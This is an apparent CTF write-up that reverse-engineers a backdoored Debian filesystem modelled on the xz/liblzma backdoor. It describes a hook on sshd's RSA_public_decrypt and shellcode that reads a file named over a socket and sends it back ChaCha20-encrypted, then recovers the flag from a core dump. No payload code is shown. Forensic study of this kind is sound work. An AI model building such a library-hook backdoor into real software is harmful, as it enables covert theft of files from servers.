# 5: Sshd

In this challenge, you are given a big tarfile of a root fileystem that has apparently been backdoored. This is essentially a forenshits challenge. This is also themed after the famous [libxz backdoor](https://en.wikipedia.org/wiki/XZ_Utils_backdoor) from this year, if you have [background knowledge](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know) about that, it makes this challenge much easier. 

The usual CTF tech here is you sort all the files by modified time because the challenge author is going to start from a base image, then change some shit to implement the challenge. So you only care about the recently modified stuff

So basically, [list all the files and sort them by time](./sorted.txt)

Unfortunately, the author did a bunch of apt upgrade shit which creates a bunch of noise in the modified time, but here we can see:

```

So essentially, we are interested in the following files:

- sshd
- liblzma.so.5.4.1
- sshd.core.93794.0.0.11.1725917676

Since these some binaries are changed, we want a base to diff them against.

From /etc/debian_version and /etc/os-release we know it's debian 12.6 (bookworm) and we can also see from the apt package manager files on disk (`status`) we can tell the exact version of sshd is openssh 1:9.2p1-2+deb12u3 and the liblzma is liblzma5_5.4.1-0.2_amd64.

We can grab these from the debian package repo and extract them with 7zip to get a clean copy.

For sshd, the changes are not interesting. The patching is also just some simple byte patches. The functions `ssh_sandbox_child` and `platform_disable_tracing` are patched out to do nothing. This is not very interesting, these basically make it so sshd no longer seccomp's itself and so it's dumpable. The latter obviously is so a corefile can be produced (for the purposes of making this challenge possible), the former so ... I guess the sshd can do "bad shit"? But this isn't actually any implementation of "bad shit", that needs to be somewhere else.

Also, if we check the corefile vmmap, we see something interesting:

![image](https://github.com/user-attachments/assets/7e64f324-0075-428e-a141-177e756e9994)

So now, we look toward liblzma.

## Liblzma backdoor

If we look at the new liblzma and the original, then use [Diaphora](http://diaphora.re/) to do some bindiffing, we can see some interesting changes.

Notably, we see a new function in the initialization function list (note, there are no symbols provided so I did the renaming):

![image](https://github.com/user-attachments/assets/a4d3e11f-5a18-4d09-b058-fd6051d0ea82)

If we follow this func it does this (func starts at 0x4DD0):

![image](https://github.com/user-attachments/assets/d7c4d5f8-e9f4-4540-9112-a7ec3c0a15d4)

(it uses an open source library called [plthook](https://github.com/kubo/plthook) to do some dirty work here, it's just statically linked in. Not very covert! lol)

So this basically hooks `RSA_public_decrypt` in opensshd to do some bad shit, it makes it go to here instead:

![image](https://github.com/user-attachments/assets/6dc6cb15-aa1d-4e30-9e13-63b18f2df9ca)

Here if the public key is some special key, it decrypts some code, mmaps to it, and jumps to it.

So let's grab that [shellcode](./plain.bin) from the corefile and look at it.

The code basically is doing this, comments added

So this is basically a backdoor that:
- opens a socket
- reads 32 bytes (a chacha20 key) from the socket
- reads 12 bytes (chacha20 nonce) from the socket
- reads 4 bytes = an integer N (length of the filename to read)
- reads N bytes from the socket
- opens the file
- reads the file
- strlen's the file contents
- chacha20 encrypt the file
- send the file to the socket

If we were doing this fully statically, the challenge would not be solvable. But luckily we have a corefile.

We are lucky the corefile was produced right after this shit was sent, so all the data we need is still just chilling on the stack. This is why it's hard to do crypto right; here the best practice would be to zero key material from memory after use, but they didn't do that.

Since chacha20 is a stream cipher, one interesting observation here is that decryption and encryption are the same operation: given the same key and nonce, they use the same keystream which is simply XORed with the input.

So all we need to do is fine the chacha20 key and nonce from the memory, as well as the encrypted flag sent, and we can just re-run this shellcode but with the ciphertext as the contents of the flag file it's reading.

Note that if you actually try to use normal chacha20 from say, Pycryptodome, it won't work because they fucked up the chacha20 implementation in some slight way that I wasn't interested in fully reversing.

I reversed the stack offsets to be 100% sure that I was getting the right data, since I wasn't trying to solve as quickly as possible. But realistically you can guess what the shit is on the stack just by staring at it and making some educated guesses, if you don't want to reverse it. Here it is:

So to run this shellcode to do the decryption, I asked Chatgpt to create a quick [read-mmap-copy-call harness](./lol.c) and then just put this under gdb.

Then, I breakpointed the start of the shellcode, and stepped through it manually. Each time it would do a syscall, I would just manually update the memory or registers in gdb to simulate the syscall reading the parameters (key, nonce, flag contents, etc.) from socket or disk.

Then you step past the chacha20 call, and voila you have your flag:
